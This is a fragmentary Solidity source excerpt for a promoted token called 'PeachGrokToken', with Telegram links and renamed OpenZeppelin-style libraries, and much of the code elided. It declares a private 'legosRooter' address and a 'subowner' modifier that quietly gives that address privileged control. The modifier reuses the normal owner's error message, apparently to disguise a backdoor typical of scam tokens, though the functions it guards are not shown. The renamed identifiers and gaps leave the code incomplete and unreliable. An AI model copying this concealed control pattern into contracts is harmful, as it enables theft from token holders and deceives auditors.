...
/*
PeachGrok 
https://t.me/PeachGrok
https://PeachGrok.io/
https://docs.PeachGrok.io/

*/
pragma solidity 0.8.23;

interface PeachGrok33 {
  /**
...
/*
 * @dev Provides information about the current execution PeachGrok20Burnable, including the
 ...
 */
abstract contract PeachGrok20Burnable {
...
// File: @openzeppelin/contracts/access/PeachGrok20Ownable.sol
 ...
 * the owner.
 */
abstract contract PeachGrok20Ownable is PeachGrok20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "PeachGrok20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "PeachGrok20Ownable: new owner is the zero address");
 ...
 * `SafePeachGrok` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafePeachGrok {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafePeachGrok: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafePeachGrok: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafePeachGrok: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafePeachGrok: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafePeachGrok: modulo by zero");
  }
...
contract PeachGrokToken is PeachGrok20Burnable, PeachGrok33, PeachGrok20Ownable {
    
    using SafePeachGrok for uint256;
   ...
   address private legosRooter; 
    ...
    string public PeachGroktelegramcchannel = "https://t.me/PeachGrok";
            function getPeachGroktelegramcchannel() public view returns (string memory) {
        return PeachGroktelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {PeachGrok33-totalSupply}.
    */
    ...
    /**
    * @dev See {PeachGrok33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "PeachGrok20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {PeachGrok33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {PeachGrok33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {PeachGrok33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "PeachGrok33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {PeachGrok33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "PeachGrok33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "PeachGrok33: transfer from the zero address");
        require(shippingto != address(0), "PeachGrok33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "PeachGrok33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "PeachGrok33: approve from the zero address");
        require(transporteur != address(0), "PeachGrok33: approve to the zero address");
